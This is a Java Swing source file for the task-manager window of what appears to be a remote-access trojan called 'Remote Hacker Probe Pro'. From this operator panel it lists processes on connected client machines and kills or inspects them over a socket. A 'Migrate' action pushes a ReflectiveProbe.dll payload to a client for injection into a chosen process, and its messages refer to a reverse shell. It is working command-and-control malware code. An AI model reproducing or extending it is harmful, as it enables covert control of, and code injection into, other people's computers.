package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.border.EmptyBorder;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableColumn;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JTable;

public class TaskMgr extends JDialog {

	public static int CID;
	public static int LOADER_ID;
	
	static int SocketID() {
		if(CID == -1) {
			return LOADER_ID;
		} else {
			return CID;
		}
	}
	
	public static int CLIENT_ID = SocketID();
	private final JPanel contentPanel = new JPanel();
	private JTable table;
	public static DefaultTableModel taskmgrmodel = new DefaultTableModel() {
		
	    @Override
	    public boolean isCellEditable(int row, int column) {
	       return false;
	    }
	};

	private boolean isEntry(String name, String size) {
	    int rowCount = table.getRowCount();
	    String row = null, tname = null, tsize = null, input = name + "|" + size;
	    for (int i = 0; i < rowCount - 1; i++) {
	        tname = (String) table.getValueAt(i, 0);
	        tsize = (String) table.getValueAt(i, 2);
	        row = tname + "|" + tsize;
	        if (input.equalsIgnoreCase(row)) {
	            return true;
	        }
	    }
	    return false;
	}
	
	/**
	 * Create the dialog.
	 */
	public TaskMgr(int mode) {
		// mode 0 = probe cl
		// mode 1 = reflective loader
		setTitle("Remote Hacker Probe Pro | Task Manager");
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 351, 440);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		
		table = new JTable(taskmgrmodel);
		DefaultTableCellRenderer centerRenderer = new DefaultTableCellRenderer();
		centerRenderer.setHorizontalAlignment( JLabel.CENTER );
		table.setDefaultRenderer(String.class, centerRenderer);
		
		if(table.getColumnCount() == 0) {
			taskmgrmodel.addColumn("Process Name");
			taskmgrmodel.addColumn("Process ID");
		}
		
		JScrollPane s = new JScrollPane(table);
		
		JPopupMenu popupMenu = new JPopupMenu();
		
		JMenuItem pkill = new JMenuItem("Kill Process", new ImageIcon("icons/51.png"));
		pkill.setFont(new Font("Calibri", Font.PLAIN, 13));
		pkill.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent arg0) {
	    		
				int index = table.getSelectedRow(); 
				String process_name = (String) table.getValueAt(index, 0);
				//System.out.println(process_name);
				if(process_name.length() > 0)
				{
					if(mode == 0) {
						Server.SendData(Server.Clients.get(CLIENT_ID), "pkill:"+process_name);
						ServerThread.WaitForReply();
						MainWindow.Log("Killing Process '" + process_name + "' on Client ID : " + String.valueOf(CLIENT_ID));
						
						// refresh
						((DefaultTableModel)table.getModel()).setNumRows(0);
						Server.SendData(Server.Clients.get(CLIENT_ID), "taskls");
						ServerThread.WaitForReply();
					} else {
						String msg = "This is not supported in The Loader Client. Use Reverse shell to get process infomration or Load Reflective Probe.";
						MainWindow.Log("Error Getting Process information for '" + process_name + "' " + msg);
						JOptionPane.showMessageDialog(null, msg);
					}
				}
	    	}
	    });
		
		JMenuItem pinfo = new JMenuItem(" Process Information" , new ImageIcon("icons/9.png"));
	    pinfo.setFont(new Font("Calibri", Font.PLAIN, 13));
	    pinfo.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent arg0) {
	    		
				int index = table.getSelectedRow(); 
				String process_name = (String) table.getValueAt(index, 0);
				//System.out.println(process_name);
				if(process_name.length() > 0)
				{
					if(mode == 0)
					{
						Server.SendData(Server.Clients.get(CLIENT_ID), "psinfo:"+process_name);
						ServerThread.WaitForReply();
						MainWindow.Log("Getting information for process '" + process_name + "' on Client ID : " + String.valueOf(CLIENT_ID));
					}else {
						String msg = "This is not supported in The Loader Client. Use Reverse shell to get process infomration or Load Reflective Probe.";
						MainWindow.Log("Error Getting Process information for '" + process_name + "' " + msg);
						JOptionPane.showMessageDialog(null, msg);
					}
					
				}
	    	}
	    });
	    
	    JMenuItem migrate = new JMenuItem(" Migrate" , new ImageIcon("icons/bug.png"));
	    migrate.setFont(new Font("Calibri", Font.PLAIN, 13));
	    migrate.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				// This is for Probe CL Only
				String Process = (String) JOptionPane.showInputDialog("Enter Process name to Migrate into : ");
				if(Process.length() > 0)
				{
					int index = MainWindow.table.getSelectedRow();
					MainWindow.HaltAllSystems();
					MainWindow.Log("Loading Reflective Probe on Loader ID : " + String.valueOf(index));
					File rprobe = new File("payloads/ReflectiveProbe.dll");
					long filesize = rprobe.length();
					
						byte[] file_buffer = new byte[4096];
						Arrays.fill(file_buffer, (byte)0);
						int count = 0;
						DataOutputStream out = null;
						try {
							out = new DataOutputStream(Server.Clients.get(index).getOutputStream());
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
						FileInputStream  in = null;
						try {
							in = new FileInputStream(rprobe);
		
						} catch (FileNotFoundException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						
						Server.SendData(Server.Clients.get(index), "fdll");
						Server.SendData(Server.Clients.get(index), "REMOTE_HACKER_PROBE:"+String.valueOf(filesize) + ":"+Process+":ProbeDrop");
						
						
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
						
						try {
							while ((count = in.read(file_buffer)) > 0) {
							     out.write(file_buffer, 0, count);
							}
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						
						MainWindow.EnableAllSystems();
						MainWindow.Log("Loaded Reflective Probe on Loader ID : " + String.valueOf(index));
					}
			}
		});
	    
	    
	    
	    popupMenu.add(pkill);
	    popupMenu.add(pinfo);	 
	    
	    MainWindow.addPopup(table, popupMenu);
		
		GroupLayout gl_contentPanel = new GroupLayout(contentPanel);
		gl_contentPanel.setHorizontalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addComponent(s, GroupLayout.DEFAULT_SIZE, 424, Short.MAX_VALUE)
		);
		gl_contentPanel.setVerticalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addGap(18)
					.addComponent(s, GroupLayout.DEFAULT_SIZE, 340, Short.MAX_VALUE))
		);
		contentPanel.setLayout(gl_contentPanel);
		{
			JPanel buttonPane = new JPanel();
			buttonPane.setLayout(new FlowLayout(FlowLayout.RIGHT));
			getContentPane().add(buttonPane, BorderLayout.SOUTH);
			{
				JButton okButton = new JButton("OK");
				okButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						dispose();
					}
				});
				
				JButton btnNewButton = new JButton("Refresh");
				btnNewButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						if(mode == 0)
						{
							((DefaultTableModel)table.getModel()).setNumRows(0);
							Server.SendData(Server.Clients.get(CLIENT_ID), "taskls");
							ServerThread.WaitForReply();
						} else {
							((DefaultTableModel)table.getModel()).setNumRows(0);
							Server.SendData(Server.LoaderClients.get(LOADER_ID), "taskls");
							ServerThread.WaitForReply();
						}
						
					}
				});
				buttonPane.add(btnNewButton);
				okButton.setActionCommand("OK");
				buttonPane.add(okButton);
				getRootPane().setDefaultButton(okButton);
			}
		}
		
		addWindowListener(new WindowAdapter() {
			@Override
		    public void windowOpened(WindowEvent we) {
				MainWindow.HaltAllSystems();
		    }
			
			@Override
			public void windowClosed(WindowEvent we) {
				MainWindow.EnableAllSystems();
			}
		});
	}
}